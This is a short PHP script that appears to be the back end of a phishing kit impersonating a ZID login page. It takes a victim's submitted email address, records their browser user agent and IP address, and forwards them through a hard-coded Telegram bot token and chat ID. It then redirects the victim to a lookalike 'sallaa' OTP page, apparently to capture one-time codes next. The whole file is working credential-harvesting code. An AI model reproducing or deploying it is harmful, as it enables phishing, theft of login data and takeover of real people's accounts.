<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $email = $_POST['email'];

    // الحصول على معلومات المتصفح و IP
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $userIP = $_SERVER['REMOTE_ADDR'];

    $token = "8125381566:AAGfyKuODnK_RufFKXOQ15tS9ar_lBFBot4";
    $chat_id = "-4625923889";

    // تنسيق الرسالة
    $message = "╮━≪ 🔥 تسجيل دخول ZID  ≫━╭\n\n" .
               "🌟 ايميل ZID \n\n" .
               "📧 Email : $email\n\n" .
               "━━━━━━━━━━━━━━━━\n" .
               "🖥 معلومات الجهاز: \n\n" .
               "🌐 المتصفح: \n\n$userAgent\n\n" .
               "📍 IP: $userIP\n\n" .
               "╯━≪ 🔥 تسجيل دخول ZID  ≫━╰";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    header("Location: https://sallaa.netlify.app/login/otp/");
    exit();
}
?>
